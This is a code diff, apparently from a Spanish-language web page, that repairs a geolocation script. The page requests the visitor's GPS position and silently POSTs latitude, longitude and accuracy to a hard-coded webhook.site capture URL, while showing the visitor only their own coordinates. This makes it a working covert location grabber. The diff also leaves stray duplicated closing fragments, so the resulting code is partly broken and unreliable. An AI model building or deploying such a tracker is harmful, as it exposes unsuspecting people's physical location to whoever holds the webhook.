@@ -21,26 +21,38 @@
             if ("geolocation" in navigator) {
                 resultado.innerHTML = "Solicitando permiso de GPS...";
 
-                // 2. Solicitar las coordenadas exactas al dispositivo
-                navigator.geolocation.getCurrentPosition(
-                    // Función de éxito (si el usuario presiona "Permitir")
-                    // Reenviar los datos a tu servidor o Webhook.site
-fetch("https://webhook.site/a965ca35-1db9-4e3d-b6a8-8d6ab5559540", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-        latitud: lat,
-        longitud: lon,
-        precision: precision
-    })
-});
-                        resultado.innerHTML = `
-                            <strong>¡Ubicación recibida con éxito!</strong><br><br>
-                            Latitud: ${lat}<br>
-                            Longitud: ${lon}<br>
-                            Precisión: +/- ${precision} metros<br><br>
-                            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">
-                                Ver en Google Maps
+              navigator.geolocation.getCurrentPosition(
+    // 2. Declaramos 'posicion' como argumento de la función de éxito
+    function(posicion) {
+        // 2. Extraemos las variables desde el objeto 'posicion'
+        const lat = posicion.coords.latitude;
+        const lon = posicion.coords.longitude;
+        const precision = posicion.coords.accuracy;
+
+        // 3. Ahora sí enviamos las variables al Webhook
+        fetch("https://webhook.site/a965ca35-1db9-4e3d-b6a8-8d6ab5559540", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                latitud: lat,
+                longitud: lon,
+                precision: precision
+            })
+        });
+
+        // 4. Mostramos el resultado en pantalla
+        resultado.innerHTML = `
+            <strong>¡Ubicación recibida con éxito!</strong><br><br>
+            Latitud: ${lat}<br>
+            Longitud: ${lon}<br>
+            Precisión: +/- ${precision} metros<br><br>
+            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">
+                Ver en Google Maps
+            </a>
+        `;
+    },
+    // Función de error...
+);
                             </a>
                         `;
                     },
